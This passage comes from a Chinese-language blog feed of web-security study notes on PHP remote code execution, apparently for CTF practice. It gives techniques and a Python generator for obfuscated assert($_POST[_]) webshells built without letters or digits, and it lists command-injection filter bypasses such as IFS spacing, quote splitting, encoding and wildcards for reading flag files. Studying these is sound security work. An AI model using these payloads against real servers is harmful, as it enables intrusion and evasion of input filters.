id="配合使用的函数"><a href="#配合使用的函数" class="headerlink" title="配合使用的函数"></a>配合使用的函数</h2><ul><li><code>getcwd()</code> 函数返回当前工作目录。</li><li><code>scandir()</code> 函数返回指定目录中的文件和目录的数组。</li><li><code>dirname()</code> 函数返回路径中的目录部分。</li><li><code>chdir()</code> 函数改变当前的目录。</li><li><code>readfile()</code> 输出一个文件。</li><li><code>current()</code> 返回数组中的当前单元, 默认取第一个值。</li><li><p><code>pos()</code> current() 的别名。</p></li><li><p><code>next()</code> 函数将内部指针指向数组中的下一个元素，并输出。</p></li><li><code>end()</code> 将内部指针指向数组中的最后一个元素，并输出。</li><li><code>array_rand()</code> 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</li><li><code>array_flip()</code> array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。</li><li><code>array_pop()</code> 删除并返回数组最后一个元素</li><li><code>array_slice()</code> 函数在数组中根据条件取出一段值，并返回。</li><li><code>array_reverse()</code> 函数返回翻转顺序的数组。</li><li><code>chr()</code> 函数从指定的 ASCII 值返回字符。</li><li><code>hex2bin()</code> — 转换十六进制字符串为二进制字符串。</li><li><code>getenv()</code> 获取一个环境变量的值(在7.1之后可以不给予参数)。</li><li><code>localeconv()</code> 函数返回一包含本地数字及货币格式信息的数组。</li><li><code>highlight_file()</code>打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的</li></ul><h1 id="无数字、字母rce"><a href="#无数字、字母rce" class="headerlink" title="无数字、字母rce"></a>无数字、字母rce</h1><p><a href="https://xz.aliyun.com/t/8107">无字母数字rce总结 </a></p><h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;eval($_POST[1]);&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p><code>shell：(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);</code></p><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><ul><li>异或脚本</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$a</span>[<span class="variable">$i</span>])^<span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;^&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;#&#x27;</span>^<span class="string">&#x27;|&#x27;</span>); <span class="comment">//得到字符 _</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;.&#x27;</span>^<span class="string">&#x27;~&#x27;</span>); <span class="comment">//得到字符 P    </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;/&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">//得到字符 0    </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;|&#x27;</span>^<span class="string">&#x27;/&#x27;</span>); <span class="comment">//得到字符 S    </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;&#123;&#x27;</span>^<span class="string">&#x27;/&#x27;</span>); <span class="comment">//得到字符 T    </span></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>).(<span class="string">&quot;.&quot;</span>^<span class="string">&quot;~&quot;</span>).(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;/&quot;</span>).(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>);  <span class="comment">//变量$__值为字符串&#x27;_POST&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&quot;!((%)(&quot;</span>^<span class="string">&quot;@[[@[\\&quot;</span>;   <span class="comment">//构造出assert</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span>;   <span class="comment">//构造出_POST</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$$__</span>;   <span class="comment">//$___ = $_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);   <span class="comment">//assert($_POST[_]);</span></span><br></pre></td></tr></table></figure><blockquote><p>需要注意的是，由于我们的Payload中含有一些特殊字符，我们需要对Payload进行一次URL编码。</p></blockquote><h2 id="或"><a href="#或" class="headerlink" title="或"></a>或</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">preg = <span class="string">&#x27;[a-z]|[0-9]&#x27;</span> <span class="comment"># 题目过滤正则</span></span><br><span class="line"><span class="comment"># 生成字典</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (re.<span class="keyword">match</span>(preg, <span class="built_in">chr</span>(i), re.I) <span class="keyword">or</span> re.<span class="keyword">match</span>(preg, <span class="built_in">chr</span>(j), re.I)):</span><br><span class="line">            k = i | j</span><br><span class="line">            <span class="keyword">if</span> <span class="number">32</span> &lt;= k &lt;= <span class="number">126</span>:</span><br><span class="line">                a = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                b = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                content += (<span class="built_in">chr</span>(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;rce_or.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    payload1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    code = <span class="built_in">input</span>(<span class="string">&quot;data:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&#x27;rce_or.txt&#x27;</span>)</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">if</span> i == line[<span class="number">0</span>]:</span><br><span class="line">                payload1 = payload1 + line[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                payload2 = payload2 + line[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    payload = <span class="string">&#x27;(&quot;&#x27;</span>+payload1+<span class="string">&#x27;&quot;|&quot;&#x27;</span>+payload2+<span class="string">&#x27;&quot;)&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;payload: &quot;</span>+ payload)</span><br></pre></td></tr></table></figure><h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="variable">$_</span>++;</span><br></pre></td></tr></table></figure><blockquote><p>$++对变量进行了自增操作,由于我们没有定义的值,PHP会给赋一个默认值NULL==0,由此我们可以看出,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字 </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;A&quot;</span>++ ==&gt; <span class="string">&quot;B&quot;</span></span><br><span class="line"><span class="string">&quot;B&quot;</span>++ ==&gt; <span class="string">&quot;C&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>如果我们能够得到”A”，那么我们就能通过自增自减，得到所有的字母。 那么问题就转化为怎么得到一个字符”A”。在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为”Array”。再取这个字符串的第一个字母，就可以获得”A”。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>.[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><blockquote><p>$<em>++对</em>变量进行了自增操作,由于我们没有定义*的值,PHP会给*赋一个默认值NULL==0,由此我们可以看出,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;   <span class="comment">//得到&quot;Array&quot;</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>[<span class="variable">$__</span>];   <span class="comment">//得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$___</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$___</span>;   <span class="comment">//$_=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;AS&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;E&quot;，此时$__=&quot;E&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSE&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;R&quot;，此时$__=&quot;R&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSER&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSERT&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&quot;_&quot;</span>;   <span class="comment">//$____=&quot;_&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;P&quot;，此时$__=&quot;P&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;O&quot;，此时$__=&quot;O&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;   <span class="comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;   <span class="comment">//$_=$_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);   <span class="comment">//ASSERT($POST[_])</span></span><br></pre></td></tr></table></figure><h2 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h2><ul><li>临时文件目录：<ul><li>Linux临时文件主要存储在<code>/tmp/</code>目录下，格式通常是（<code>/tmp/php[6个随机字符]</code>）</li><li>Windows临时文件主要存储在<code>C:/Windows/</code>目录下，格式通常是（<code>C:/Windows/php[4个随机字符].tmp</code>）</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/2023/07/26/RCE/"/>
      <url>/2023/07/26/RCE/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="RCE概述"><a href="#RCE概述" class="headerlink" title="RCE概述"></a>RCE概述</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法</p><h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><ul><li>利用系统函数实现命令执行的函数</li></ul><blockquote><p>eval()<br>assert()<br>preg_replace()<br>call_user_func()</p></blockquote><ul><li>直接执行系统命令的代码函数</li></ul><blockquote><p>system()<br>exec()<br>shell_exec()&amp;(``)<br>passthru()<br>pcntl_exec()<br>popen()<br>proc_open()</p></blockquote><h1 id="命令拼接符号"><a href="#命令拼接符号" class="headerlink" title="命令拼接符号"></a>命令拼接符号</h1><ul><li>Windows的系统命令拼接符</li></ul><div class="table-container"><table><thead><tr><th>符号</th><th>含义</th><th>示例</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>左边的命令执行成功，右边的才执行</td><td>ping 127.0.0.1 &amp;&amp; echo ‘hello’</td></tr><tr><td>&amp;</td><td>简单拼接，两边都能执行</td><td>ping 1111 &amp; echo ‘hello’</td></tr><tr><td>\</td><td></td><td>上一条命令输出作为下一条命令参数netstst -ano</td><td>netstst -ano \</td><td>findstr 3306</td></tr><tr><td>\</td><td>\</td><td></td><td>左边的执行失败右边的才执行</td><td>ping baidu.com \</td><td>\</td><td>ping baidu.net</td></tr></tbody></table></div><ul><li>Linux的系统命令拼接符</li></ul><div class="table-container"><table><thead><tr><th>符号</th><th>含义</th><th>示例</th></tr></thead><tbody><tr><td>；</td><td>没有任何逻辑关系的连接符</td><td></td></tr><tr><td>&amp;&amp;</td><td>左边的命令执行成功，右边的才执行</td><td>cp 1.txt 2.txt &amp;&amp; cat 2.txt</td></tr><tr><td>\</td><td></td><td>上一条命令输出作为下一条命令参数</td><td>netstat -an\</td><td>netstat -an</td></tr><tr><td>\</td><td>\</td><td></td><td>左边的命令执行失败，右边的才执行</td><td>cat 3.txt\</td><td>\</td><td>cat 3.txt</td></tr><tr><td>&amp;</td><td>任务后台执行，与nohup命令功能差不多</td><td>java -jar test.jar &gt; log.txt &amp;</td></tr></tbody></table></div><h1 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h1><h2 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h2><blockquote><p><code>%09</code>（url传递）(tab)</p><p><code>%20</code>(space)</p><p><code>$&#123;IFS&#125;</code></p><p><code>$IFS$9</code></p><p><code>&lt;&gt;</code>（cat&lt;&gt;/flag）</p><p><code>&lt;</code>（cat&lt;/flag）</p><p><code>$IFS</code></p><p><code>&#123;cat,flag&#125;</code> //花括号</p></blockquote><h2 id="过滤了关键字"><a href="#过滤了关键字" class="headerlink" title="过滤了关键字"></a>过滤了关键字</h2><h3 id="cat过滤后的替代函数"><a href="#cat过滤后的替代函数" class="headerlink" title="cat过滤后的替代函数"></a>cat过滤后的替代函数</h3><blockquote><p><code>more</code> 一页一页的显示档案内容<br><code>less</code> 与 more 类似<br><code>head</code> 查看头几行<br><code>tac</code> 从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br><code>tail</code> 查看尾几行<br><code>nl</code> 显示的时候，顺便输出行号<br><code>od</code> 以二进制的方式读取档案内容<br><code>vi</code> 一种编辑器，可以查看<br><code>vim</code> 一种编辑器，可以查看<br><code>sort</code> 可以查看<br><code>uniq</code> 可以查看<br><code>file -f</code> 报错出具体内容<br><code>sh /flag 2&gt;%261</code>  //报错出文件内容</p></blockquote><h3 id="‘-’和单双引号以及反撇绕过过滤"><a href="#‘-’和单双引号以及反撇绕过过滤" class="headerlink" title="‘\’和单双引号以及反撇绕过过滤"></a>‘\’和单双引号以及反撇绕过过滤</h3><blockquote><p><code>ca\t flag</code></p><p><code>ca&#39;&#39;t flag</code></p><p><code>ca&quot;&quot;t flag</code> </p><p><code>ca``t flag</code></p></blockquote><p><img src="/img/RCE/rce_01.png" alt=""></p><h3 id="变量绕过"><a href="#变量绕过" class="headerlink" title="变量绕过"></a>变量绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=a;c=t;$a$b<span class="variable">$c</span> flag.php</span><br></pre></td></tr></table></figure><p><img src="/img/RCE/rce_02.png" alt=""></p><h3 id="命令拆分绕过"><a href="#命令拆分绕过" class="headerlink" title="命令拆分绕过"></a>命令拆分绕过</h3><p>和变量绕过是一个道理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=fl;b=ag.php;<span class="keyword">echo</span> $a<span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p><img src="/img/RCE/rce_03.png" alt=""></p><h3 id="进制编码绕过"><a href="#进制编码绕过" class="headerlink" title="进制编码绕过"></a>进制编码绕过</h3><p><strong>16进制绕过</strong></p><p><code>63617420666c61672e706870</code>为<code>cat flag.php</code>的十六进制</p><p><img src="/img/RCE/rce_04.png" alt=""></p><p><strong>base64&amp;base32编码绕过</strong></p><p> <code>cat flag</code>的base64编码为<code>Y2F0IGZsYWcucGhw</code></p><p><img src="/img/RCE/rce_05.png" alt=""></p><p> <code>cat flag</code>的base32编码为<code>MNQXIIDGNRQWOLTQNBYA====</code></p><p><img src="/img/RCE/rce_06.png" alt=""></p><p>base16也是一个道理</p><h3 id="通配符正则绕过"><a href="#通配符正则绕过" class="headerlink" title="通配符正则绕过"></a>通配符正则绕过</h3><p>如果正则匹配过滤了一些关键字，如：flag、php、txt等等可以使用问号(?)代替某个字符</p><p>适当的可以用星号(*)</p><p><strong>注意：这里的?和*都只能用于文件名，如果是命令(类似ls cat等)就不适用</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php === cat ??ag.php ===cat ?la* </span><br></pre></td></tr></table></figure><p><img src="/img/RCE/rce_07.png" alt=""></p><h3 id="system-函数过滤"><a href="#system-函数过滤" class="headerlink" title="system()函数过滤"></a>system()函数过滤</h3><p><strong>十六进制绕过</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(); === <span class="title function_ invoke__">system</span>();</span><br></pre></td></tr></table></figure><p><strong>括号绕过</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(sy.(st).em)(); === <span class="title function_ invoke__">system</span>();</span><br></pre></td></tr></table></figure><p><strong>内敛替代</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> `ls`;</span><br><span class="line"><span class="keyword">echo</span> $(ls);</span><br><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`ls`;</span><br><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>$(ls);</span><br><span class="line"><span class="meta">&lt;?=</span>`ls /`;<span class="meta">?&gt;</span>  等效于<span class="meta">&lt;?php</span> <span class="keyword">echo</span> `ls /`; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>取反(~)绕过</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)();===<span class="title function_ invoke__">system</span>();</span><br></pre></td></tr></table></figure><p><img src="/img/RCE/rce_08.png" alt=""></p><h3 id="使用∗和-x-x表示任意数字-数字"><a href="#使用∗和-x-x表示任意数字-数字" class="headerlink" title="使用∗和@,x(x表示任意数字),{数字}"></a>使用∗和@,x(x表示任意数字),{数字}</h3><p>在没有传参的情况下，这三个特殊变量值都是为空的，所以可以利用其绕过一些过滤</p><blockquote><p>ca$*t  flag.php</p><p>ca$@t  flag.php</p><p>ca$4t  flag.php</p><p>cat${10}  flag.php </p></blockquote><p><img src="/img/RCE/rce_09.png" alt=""></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://zhuanlan.zhihu.com/p/391439312">命令执行(RCE)面对各种过滤，骚姿势绕过总结 </a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP特性</title>
      <link href="/2023/07/26/PHP%E7%89%B9%E6%80%A7/"/>
      <url>/2023/07/26/PHP%E7%89%B9%E6%80%A7/</url>
      
